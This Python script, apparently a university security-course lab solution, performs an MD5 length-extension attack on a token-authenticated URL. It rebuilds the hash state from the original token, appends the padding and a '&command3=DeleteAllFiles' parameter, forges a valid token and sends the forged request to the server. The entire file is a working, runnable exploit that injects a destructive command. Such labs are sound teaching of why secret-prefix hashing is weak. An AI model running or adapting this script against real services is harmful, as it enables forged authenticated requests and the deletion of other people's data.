import urllib
from pymd5 import md5, padding
import http.client
import sys
import re

if len(sys.argv) != 2:
    print('Requires the URL to extend as a command line argument.')
    original_url = 'https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'
    # exit(1)
else:
    original_url = sys.argv[1]



# brek up the url into parts to work with
url_beginning_object = re.search("(^.*)?\?", original_url)
url_beginning = url_beginning_object.group()
# print("Beginning: " + url_beginning)

original_token_object = re.search("(?<=token=).*?(?=&user)", original_url)
original_token = original_token_object.group()
# print("OG token: " + original_token)

original_query_object = re.search("(user).*", original_url)
original_query = original_query_object.group()
# print("OG Query: " + original_query)

malicious_addition = "&command3=DeleteAllFiles"
# print("Malicious Code: " + malicious_addition)

# Your code to modify url goes here
original_message_len = 8 + len(original_query)
# print(original_message_len)
pad = padding(original_message_len * 8)
print(pad)
total_message_len = (original_message_len + len(pad)) * 8
# print(total_message_len)
h = md5(state=bytes.fromhex(original_token), count=total_message_len)
h.update(malicious_addition.encode())
updated_token = h.hexdigest()
# print("New Token: " + updated_token)

url_safe_padding = urllib.parse.quote(pad)
# print("Padding: " + url_safe_padding)


new_url = '{}token={}&{}{}{}'.format(url_beginning, updated_token, original_query, url_safe_padding, malicious_addition)
# new_url = url_beginning + "token=" + updated_token + original_query + url_safe_padding + malicious_addition
# print("This it the new URL: \n" + new_url)


# The following code requests the URL and returns the response from the server
parsed_url = urllib.parse.urlparse(new_url)
conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query)
print("\nResponse from Web:")
print(conn.getresponse().read())